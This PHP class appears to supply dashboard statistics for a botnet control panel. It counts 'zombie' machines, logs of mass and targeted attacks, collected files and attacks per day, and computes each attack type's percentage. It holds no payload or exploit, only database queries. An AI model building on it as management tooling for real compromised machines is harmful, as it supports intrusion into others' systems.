<?php

require_once 'config/connexion.php';


class ModeleAccueil {

    public function nb_zombie()
    {
        try {
            $req = Connexion::$bdd->prepare('select id_machine from Machine');
            $req->execute();
            $nb = $req->rowCount();
            return $nb;
        } catch (PDOException $e) {
        }
    }

    public function nb_at()
    {
        try {
            $req = Connexion::$bdd->prepare('select id_historique_attaque from historique_attaque');
            $req->execute();
            $nb = $req->rowCount();
            return $nb;
        } catch (PDOException $e) {
        }
    }

    public function nb_at_massive()
    {
        try {
            $req = Connexion::$bdd->prepare('select id_historique_attaque from historique_attaque where cible = ?');
            $req->execute(array(0));
            $nb = $req->rowCount();
            return $nb;
        } catch (PDOException $e) {
        }
    }

    public function nb_at_cible()
    {
        try {
            $req = Connexion::$bdd->prepare('select id_historique_attaque from historique_attaque where cible = ?');
            $req->execute(array(1));
            $nb = $req->rowCount();
            return $nb;
        } catch (PDOException $e) {
        }
    }

    public function nb_donnee()
    {
        try {
            $req = Connexion::$bdd->prepare('select id_fichier from Fichier');
            $req->execute();
            $nb = $req->rowCount();
            return $nb;
        } catch (PDOException $e) {
        }
    }

    function cacul_pourcentage($nombre,$total,$pourcentage)
    { 
      $resultat = ($nombre/$total) * $pourcentage;
      return round($resultat); // Arrondi la valeur
    } 

    function nb_attaque_par_j($date)
    { 
        try {
            $req = Connexion::$bdd->prepare("select count(id_historique_attaque) from historique_attaque where date_attaque = ?");
            $req->execute(array($date));
            $nb = $req->fetch();
            return $nb;
        } catch (PDOException $e) {
        }
    } 

    public function tab_pourcentage_par_attaque($attaques_possibles)
    {
        $result = array();
        $result_2 = array();

        try {
            $req = Connexion::$bdd->prepare('select id_historique_attaque from historique_attaque');
            $req->execute();
            $total = $req->rowCount();
        } catch (PDOException $e) {
        }

        $i = 0;
        foreach ($attaques_possibles as $attaque) {
            try {
                $req = Connexion::$bdd->prepare('select id_historique_attaque from historique_attaque inner join Attaque ON historique_attaque.id_attaque = Attaque.id_attaque where Attaque.attaque_possible = ?');
                $req->execute(array($attaque));
                $nb = $req->rowCount();
                $result[$i] = $nb;
                $i++;
            } catch (PDOException $e) {
            }
        }

        $i = 0;
        foreach ($attaques_possibles as $attaque) {
            try {
               
                $result_2[$i] = $this->cacul_pourcentage($result[$i], $total, 100);
                $i++;
            } catch (PDOException $e) {
            }
        }

        return $result_2;
    }

    function get_attaques_possibles()
    { 
        try {
            $req = Connexion::$bdd->prepare("select attaque_possible from Attaque");
            $req->execute();
            $result = $req->fetchAll();
            return $result;
        } catch (PDOException $e) {
        }
    } 

    function obj_to_array($obj) {
        $result = array();
        $i = 0;
        foreach ($obj as $value) {
            $result[$i] = $value[0];
            $i++;
        }    
        return $result;
    }
}